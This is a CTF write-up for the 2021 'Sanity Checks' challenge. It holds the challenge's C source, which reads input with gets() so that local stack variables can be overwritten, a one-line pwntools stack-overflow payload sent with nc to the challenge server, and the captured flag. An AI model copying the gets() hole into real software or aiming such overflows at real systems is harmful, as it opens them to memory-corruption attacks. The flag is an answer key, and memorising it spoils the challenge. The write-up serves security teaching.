# Sanity Checks

I made a program (source) to protect my flag. On the off chance someone does get in, I added some sanity checks to detect if something fishy is going on. See if you can hack me at ```/problems/2021/sanity_checks``` on the shell server, or connect with ```nc shell.actf.co 21303```

* Hints:
```gdb``` may be helpful for analyzing how data is laid out in memory.

* Given Source code:
```#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char password[64];
    int ways_to_leave_your_lover = 0;
    int what_i_cant_drive = 0;
    int when_im_walking_out_on_center_circle = 0;
    int which_highway_to_take_my_telephones_to = 0;
    int when_i_learned_the_truth = 0;
    
    printf("Enter the secret word: ");
    
    gets(&password);
    
    if(strcmp(password, "password123") == 0){
        puts("Logged in! Let's just do some quick checks to make sure everything's in order...");
        if (ways_to_leave_your_lover == 50) {
            if (what_i_cant_drive == 55) {
                if (when_im_walking_out_on_center_circle == 245) {
                    if (which_highway_to_take_my_telephones_to == 61) {
                        if (when_i_learned_the_truth == 17) {
                            char flag[128];
                            
                            FILE *f = fopen("flag.txt","r");
                            
                            if (!f) {
                                printf("Missing flag.txt. Contact an admin if you see this on remote.");
                                exit(1);
                            }
                            
                            fgets(flag, 128, f);
                            
                            printf(flag);
                            return;
                        }
                    }
                }
            }
        }
        puts("Nope, something seems off.");
    } else {
        puts("Login failed!");
    }
}
```
# Python Code: 
```python -c "from pwn import *; print('password123\x00' + 'A'*64 + p32(0x11) + p32(0x3d) + p32(0xf5) + p32(0x37) + p32(0x32)) " | nc shell.actf.co 21303```

# Flag: 
```actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}```

